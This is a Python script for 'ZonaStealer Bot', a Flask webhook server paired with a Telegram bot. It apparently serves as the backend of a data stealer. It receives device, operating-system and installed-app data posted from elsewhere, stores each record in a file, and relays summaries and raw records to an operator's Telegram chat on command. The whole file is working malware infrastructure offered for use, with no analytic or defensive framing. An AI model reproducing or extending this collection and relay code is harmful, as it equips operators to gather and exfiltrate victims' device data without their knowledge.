import telebot
import json
import os
import logging
from flask import Flask, request
import threading
import time

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Загрузка конфига
with open('Config.json', 'r') as f:
    config = json.load(f)

TOKEN = config['bot_token']
CHAT_ID = config['chat_id']
WEBHOOK_URL = config['webhook_url'] + "/webhook"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Хранилище данных
received_data = []

@app.route('/')
def index():
    return "ZonaStealer Bot is running!"

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.json
        logger.info(f"Received data: {data}")
        
        # Сохраняем данные
        received_data.append(data)
        
        # Отправляем в Telegram
        message = f"🔔 НОВЫЕ ДАННЫЕ:\n\n"
        message += f"📱 Устройство: {data.get('device', 'Unknown')}\n"
        message += f"🖥️ ОС: {data.get('os', 'Unknown')}\n"
        message += f"📊 Статус: {data.get('status', 'No status')}\n"
        
        if 'apps' in data and data['apps']:
            apps_count = len(data['apps'])
            message += f"📦 Приложений: {apps_count}\n"
            if apps_count > 0:
                message += f"Первое приложение: {data['apps'][0]}\n"
        
        bot.send_message(CHAT_ID, message)
        
        # Сохраняем в файл
        save_to_file(data)
        
        return {"status": "success", "message": "Data received"}, 200
    except Exception as e:
        logger.error(f"Error in webhook: {e}")
        return {"status": "error", "message": str(e)}, 500

@app.route('/data', methods=['GET'])
def get_data():
    """Просмотр полученных данных"""
    return {
        "total_received": len(received_data),
        "data": received_data[-10:] if received_data else []
    }

def save_to_file(data):
    """Сохранение данных в JSON файл"""
    try:
        filename = f"data_{int(time.time())}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        logger.info(f"Data saved to {filename}")
    except Exception as e:
        logger.error(f"Error saving file: {e}")

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "✅ ZonaStealer Bot активен!\n\n"
                         "📊 Статистика:\n"
                         f"• Получено записей: {len(received_data)}\n"
                         f"• Webhook URL: {WEBHOOK_URL}\n\n"
                         "Команды:\n"
                         "/data - Посмотреть последние данные\n"
                         "/clear - Очистить данные\n"
                         "/status - Статус системы")

@bot.message_handler(commands=['data'])
def show_data(message):
    if received_data:
        last = received_data[-1]
        bot.send_message(message.chat.id, 
                        f"Последние данные:\n{json.dumps(last, indent=2, ensure_ascii=False)}")
    else:
        bot.send_message(message.chat.id, "Данных пока нет")

@bot.message_handler(commands=['clear'])
def clear_data(message):
    global received_data
    received_data.clear()
    bot.send_message(message.chat.id, "✅ Данные очищены")

@bot.message_handler(commands=['status'])
def status(message):
    import psutil
    memory = psutil.virtual_memory()
    bot.send_message(message.chat.id,
                    f"📊 Статус сервера:\n"
                    f"• CPU: {psutil.cpu_percent()}%\n"
                    f"• RAM: {memory.percent}%\n"
                    f"• Данных: {len(received_data)} записей\n"
                    f"• Webhook: {WEBHOOK_URL}")

def set_webhook():
    """Установка вебхука"""
    try:
        bot.remove_webhook()
        time.sleep(1)
        bot.set_webhook(url=WEBHOOK_URL)
        logger.info(f"Webhook set to: {WEBHOOK_URL}")
    except Exception as e:
        logger.error(f"Error setting webhook: {e}")

def start_bot_polling():
    """Запуск бота в режиме polling (резервный)"""
    logger.info("Starting bot polling...")
    bot.polling(none_stop=True, interval=1)

def main():
    """Основная функция запуска"""
    logger.info("Starting ZonaStealer Bot...")
    
    # Устанавливаем вебхук
    set_webhook()
    
    # Отправляем сообщение о запуске
    try:
        bot.send_message(CHAT_ID, "🚀 ZonaStealer Bot запущен!\n"
                                 f"✅ Webhook: {WEBHOOK_URL}\n"
                                 "✅ Система готова к приему данных")
    except Exception as e:
        logger.error(f"Can't send startup message: {e}")
    
    # Запускаем Flask в отдельном потоке
    flask_thread = threading.Thread(target=lambda: app.run(
        host='0.0.0.0',
        port=int(os.environ.get('PORT', 5000)),
        debug=False,
        use_reloader=False
    ))
    flask_thread.daemon = True
    flask_thread.start()
    
    # Запускаем polling как резерв
    start_bot_polling()

if __name__ == '__main__':
    main()
